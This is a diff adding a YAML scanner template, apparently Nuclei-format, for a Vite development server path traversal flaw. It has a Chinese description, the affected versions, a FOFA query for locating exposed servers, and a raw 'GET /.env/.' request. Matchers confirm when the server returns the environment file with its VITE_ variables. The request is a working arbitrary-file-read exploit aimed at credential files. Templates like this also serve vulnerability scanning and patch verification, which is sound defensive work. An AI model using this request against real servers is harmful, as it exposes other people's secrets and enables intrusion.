@@ -1,0 +1,30 @@
+id: vite-dev-server-path-traversal-arbitrary-file-read
+
+info:
+  name: "Vite 开发服务器路径遍历导致任意文件读取漏洞"
+  author: NdayPoc
+  severity: high
+  description: |-
+    fofa: body="/@vite/client"
+    Vite 是一款面向 JavaScript 的前端构建工具。在版本 6.3.4、6.2.7、6.1.6、5.4.19 及 4.5.14 之前，由于文件匹配模式存在缺陷，攻击者可利用路径遍历读取项目根目录下本应被拒绝访问的文件内容。该漏洞仅影响明确将 Vite 开发服务器暴露给外部网络的实例（通过 --host 或 server.host 配置启用）。
+  reference:
+  - https://mp.weixin.qq.com/s/dnYGB8MHpI5XwX6mB1YIiw
+  tags: Vite
+
+
+http:
+- raw:
+  - |
+    GET /.env/. HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'VITE_'
+    - '='
+    condition: and
+  - type: status
+    status:
+    - 200
